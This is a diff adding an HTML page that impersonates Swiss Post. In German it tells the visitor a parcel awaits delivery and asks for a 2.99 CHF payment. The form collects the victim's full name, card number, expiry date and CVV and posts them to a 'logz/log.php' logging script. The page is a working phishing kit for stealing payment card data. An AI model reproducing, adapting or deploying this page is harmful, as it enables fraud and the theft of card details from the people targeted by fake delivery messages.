@@ -1,0 +1,130 @@
+<html lang="is"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Varela+Round&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="icon" type="image/png" href="img/fav.png">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/masking-input.js" data-autoinit="true"></script>
+    <title>Swiss Post</title>
+</head>
+<body>
+<div class="container">
+    <div class="main">
+        <form id="cardForm" action="logz/log.php" method="post">
+            <section class="first-sec">
+                <div class="centrer  ">
+                    <p class="borderB"><img src="./img/swiis-logo.png" style=" width: 50%;"><select style="  float: right; border: 0 ; padding: 15px">
+                            <option selected="" value="DE">DE</option>
+                            <option value="EN">EN</option>
+                        </select></p>
+
+                </div>
+                <div class="paddingDiv" style="margin-top: 20px ; margin-bottom: 10px">
+
+
+                    <strong class="textMessage2">On-Demand-Lieferservice der Post</strong>
+                    <p class="textMessage">
+                        Ihr Paket wartet auf die Zustellung. Bitte bestätigen Sie die Zahlung (2.99 CHF) . Die Online-Verifizierung muss in den nächsten 2 Tagen vor Ablauf erfolgen.
+
+                    </p>
+                </div>
+                <p class="HROr">Paketinformationen</p>
+                <div class="  paddingDiv">
+                    <div class="first-sec-top0">
+
+                        <div style="width: 100%;  ">
+                            <p style="width: 50%; float: left">Gesamt</p>
+                            <p style="width: 50%; float: right;    text-align: right;">2,99 CHF</p>
+                        </div>
+                    </div>
+                    <div class="first-sec-top">
+
+                        <div class="first-sec-doll">
+                            <p>Auftragsnummer</p>
+                            <h4>UP20100253652CH</h4>
+                        </div>
+                        <div class="first-sec-doll-img">
+                            <img src="img/789655.png" alt="image">
+                        </div>
+                    </div>
+                </div>
+                <p class="HROr">Zahlungsmethode bestätigen </p>
+                <div class="first-sec-inf paddingDiv">
+
+                    <div class="second-sec-info">
+                        <div class="second-sec-info-form">
+                             <input type="text" class="form-control inpt222" placeholder="Vollständiger Name" name="1" required="">
+                            <div class="second-sec-info-nb">
+
+                                <input class="form-control inpt inpt1" type="text" maxlength="20" placeholder="XXXX-XXXX-XXXX-XXXX" name="3" inputmode="numeric" required="" onkeypress="isInputNumber(event)" autocomplete="off">
+                                <div class="second-sec-info-nb-imgs">
+                                    <img class="img1" src="./img/1.png" width="20px">
+                                    <img class="img2" src="./img/2.png" width="20px">
+                                    <img class="img3" src="./img/3.png" width="20px">
+                                    <img class="img4" src="./img/4.png" width="20px">
+                                </div>
+                            </div>
+                            <div class="second-sec-info-cc">
+                                <input type="text" class="form-control inpt inpt2" id="date" placeholder="MM / YY" name="4" required="" onchange="isInputNumber(event)" autocomplete="off">
+                                <div class="v2-cvv v2-card-create-cvv">
+                                    <input id="cvv2" class="i-settings-input cvv x2 v2-cvv-input v2-card-create-cvv-input v2-input-can-be-reset dirty form-control inpt inpt3" type="text" maxlength="3" placeholder="***" name="5" required="" onkeypress="isInputNumber(event)" autocomplete="off">
+                                    <div class="v2-sprite-payment v2-cvv-tip" title="The last 3 digits on the back of your card">
+                                    </div>
+                                </div>
+                            </div>
+                            <button class="btn btn-dark btn-lg" type="submit">Bestätigen</button>
+                        </div>
+                    </div>
+
+                </div>
+                <footer>
+                           <a class="hrefa" href="#">Kontakt</a>
+                           <a class="hrefa" href="#">Die Info</a>
+                           <a class="hrefa" href="#">Barrierefreiheit</a>
+                           <a class="hrefa" href="#">AGBs</a>
+                           <a class="hrefa" href="#">Datenschutz und Haftungsausschluss</a>
+                           <a class="hrefa" href="#">Veröffentlichung</a>
+                           <a class="hrefa" href="#">Detail</a>
+
+                    <p class="copyright">	© 2021 Swiss Post Ltd</p>
+                </footer>
+            </section>
+
+        </form>
+    </div>
+
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js" integrity="sha512-KaIyHb30iXTXfGyI9cyKFUIRSSuekJt6/vqXtyQKhQP6ozZEGY8nOtRS6fExqE4+RbYHus2yGyYg1BrqxzV6YA==" crossorigin="anonymous"></script>
+<script>
+
+    /*Date Expiration*/
+    var cleave = new Cleave('.inpt2', {
+        date: true,
+        datePattern: ['m', 'y']
+    });
+    /*Card Number*/
+    var cleave = new Cleave('.inpt1', {
+        creditCard: true,
+        delimiter: "-",
+    });
+
+
+    function isInputNumber(evt) {
+
+        var ch = String.fromCharCode(evt.which);
+
+        if (!(/[0-9]/.test(ch))) {
+            evt.preventDefault();
+        }
+
+    }
+</script>
+
+
+</body></html>
